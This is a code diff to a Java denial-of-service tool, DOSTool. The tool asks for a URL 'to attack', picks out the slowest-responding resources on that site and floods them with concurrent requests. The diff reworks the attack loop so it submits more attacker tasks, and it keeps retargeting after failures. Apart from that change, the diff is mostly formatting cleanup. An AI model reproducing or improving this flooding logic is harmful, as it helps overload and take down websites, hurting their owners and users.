@@ -1,6 +1,5 @@
 package com.ehsunbehravesh.dostool;
 
-
 import com.ehsunbehravesh.dostool.log.LogUtil;
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -94,17 +93,21 @@ public class DOSTool implements Observer {
   }
 
   private void attack() {
-    attackExecutor = Executors.newFixedThreadPool(threadsOfAttack);    
-    
-    for (Resource resource : resourcesToAttack) {
-      ResourceAttacker resourceAttacker = new ResourceAttacker(resource);
-      resourceAttacker.addObserver(this);
-      attackExecutor.execute(resourceAttacker);
+    attackExecutor = Executors.newFixedThreadPool(threadsOfAttack);
+
+    int i = 0;
+    while (i < threadsOfAttack) {
+      for (Resource resource : resourcesToAttack) {
+        ResourceAttacker resourceAttacker = new ResourceAttacker(resource);
+        resourceAttacker.addObserver(this);
+        attackExecutor.execute(resourceAttacker);
+        i++;
+      }      
     }
 
     while (!attackExecutor.isTerminated()) {
-      logger.log(Level.INFO, "Attack is under progress: successful {0} - failed: {1}", 
-              new Object[] {successfulAttacks, failedAttacks});
+      logger.log(Level.INFO, "Attack is under progress: successful {0} - failed: {1}",
+              new Object[]{successfulAttacks, failedAttacks});
       try {
         Thread.sleep(5000);
       } catch (InterruptedException ex) {
@@ -119,7 +122,7 @@ public class DOSTool implements Observer {
       ResourceAttacker attacker = (ResourceAttacker) o;
       Boolean error = (Boolean) arg;
       if (error) {
-        incrementFailedAttacks();        
+        incrementFailedAttacks();
         replaceTheAttackResource(attacker.getResource());
       } else {
         incrementSuccessfulAttacks();
@@ -127,12 +130,12 @@ public class DOSTool implements Observer {
       }
     }
   }
-  
+
   private void replaceTheAttackResource(Resource resource) {
     if (resourcesToAttack.contains(resource)) {
       resourcesToAttack.remove(resource);
     }
-    
+
     boolean added = false;
     int i = 0;
     while (!added) {
@@ -142,8 +145,8 @@ public class DOSTool implements Observer {
         added = true;
         attackExecutor.execute(new ResourceAttacker(resource1));
         logger.log(Level.INFO, "Resource {0} has been replaced by {1}",
-                new Object[] {resource.getUrl().toString(),
-                resource1.getUrl().toString()});
+                new Object[]{resource.getUrl().toString(),
+          resource1.getUrl().toString()});
       }
     }
   }
@@ -155,7 +158,7 @@ public class DOSTool implements Observer {
   public void setResourcesToAttack(List<Resource> resourcesToAttack) {
     this.resourcesToAttack = resourcesToAttack;
   }
-  
+
   public static void main(String[] args) throws MalformedURLException {
     if (args.length <= 0) {
       System.out.println("Please enter the URL to attack.");
@@ -187,19 +190,16 @@ public class DOSTool implements Observer {
       logger.log(Level.INFO, "Top {0} resources based on response time: ", topLength);
 
       dosTool.setResourcesToAttack(new ArrayList<Resource>());
-      
+
       for (int i = 0; i < topLength; i++) {
         Resource resource = dosTool.getResources().get(i);
         dosTool.getResourcesToAttack().add(resource);
         logger.log(Level.INFO, "Response Time {0}: {1}",
                 new Object[]{resource.getResponseTime(), resource.getUrl().toString()});
-        
+
       }
 
       dosTool.attack();
     }
   }
-
-  
-  
 }
